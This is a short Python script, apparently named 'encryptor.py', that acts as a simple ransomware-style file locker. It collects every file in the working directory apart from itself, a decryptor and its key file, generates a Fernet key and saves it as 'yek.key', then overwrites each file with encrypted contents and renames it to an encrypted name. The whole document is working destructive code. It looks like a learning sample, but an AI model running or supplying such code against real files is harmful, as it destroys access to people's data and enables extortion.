import os
from tokenize import Name
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
    if file == "encryptor.py" or file == "decryptor.py" or file == "yek.key":
        continue
    if os.path.isfile(file):
        files.append(file)
    

key = Fernet.generate_key()

with open("yek.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
    old_name = file.encode('utf-8') 
    name_encrypted = Fernet(key).encrypt(old_name)
    os.rename(file, name_encrypted)
        